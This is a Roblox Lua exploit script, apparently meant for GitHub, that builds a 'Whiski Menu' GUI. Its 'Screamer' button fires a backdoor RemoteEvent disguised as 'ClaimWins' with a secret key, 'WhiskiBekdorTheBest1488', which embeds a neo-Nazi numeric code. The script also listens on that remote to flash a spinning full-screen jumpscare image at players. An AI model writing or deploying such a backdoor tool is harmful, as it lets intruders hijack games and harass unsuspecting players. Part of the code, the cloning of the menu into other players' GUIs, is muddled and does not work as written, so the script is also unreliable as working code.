-- gui.lua (заливаешь на GitHub)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "WhiskiMenu"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
frame.BackgroundTransparency = 0.05
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Whiski Menu"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
closeBtn.BackgroundTransparency = 0.3
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1, 0)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local drag = {
    dragging = false,
    offset = Vector2.new()
}

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        drag.dragging = true
        drag.offset = Vector2.new(mouse.X - frame.AbsolutePosition.X, mouse.Y - frame.AbsolutePosition.Y)
    end
end)

frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        drag.dragging = false
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    if drag.dragging then
        frame.Position = UDim2.new(0, mouse.X - drag.offset.X, 0, mouse.Y - drag.offset.Y)
    end
end)

local buttonY = 50
local function CreateButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0, buttonY)
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    btn.BackgroundTransparency = 0.3
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.Gotham
    btn.Parent = frame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    btn.MouseButton1Click:Connect(callback)
    
    buttonY = buttonY + 50
    return btn
end

local function Screamer()
    local screamerGui = Instance.new("ScreenGui")
    screamerGui.Name = "Screamer"
    screamerGui.ResetOnSpawn = false
    screamerGui.IgnoreGuiInset = true
    screamerGui.Parent = player:WaitForChild("PlayerGui")
    
    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(1, 0, 1, 0)
    image.Position = UDim2.new(0, 0, 0, 0)
    image.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    image.Image = "rbxassetid://89956031378786"
    image.ScaleType = Enum.ScaleType.Fit
    image.Parent = screamerGui
    
    local rotation = 0
    local connection = game:GetService("RunService").RenderStepped:Connect(function()
        rotation = rotation + 15
        image.Rotation = rotation
    end)
    
    task.wait(5)
    connection:Disconnect()
    screamerGui:Destroy()
end

CreateButton("Screamer (Fullscreen)", function()
    for _, plr in ipairs(Players:GetPlayers()) do
        local guiClone = screenGui:Clone()
        guiClone.Parent = plr:WaitForChild("PlayerGui")
        
        local cloneFrame = guiClone:FindFirstChild("Frame")
        if cloneFrame then
            for _, btn in ipairs(cloneFrame:GetChildren()) do
                if btn:IsA("TextButton") and btn.Text == "Screamer (Fullscreen)" then
                    btn.MouseButton1Click:Connect(function()
                        local rem = ReplicatedStorage:FindFirstChild("ClaimWins")
                        if rem then
                            rem:FireServer("WhiskiBekdorTheBest1488", "screamer")
                        end
                    end)
                end
            end
        end
    end
end)

local rem = ReplicatedStorage:FindFirstChild("ClaimWins")
if rem then
    rem.OnClientEvent:Connect(function(action, ...)
        if action == "screamer" then
            Screamer()
        end
    end)
end

print("Whiski Menu loaded")
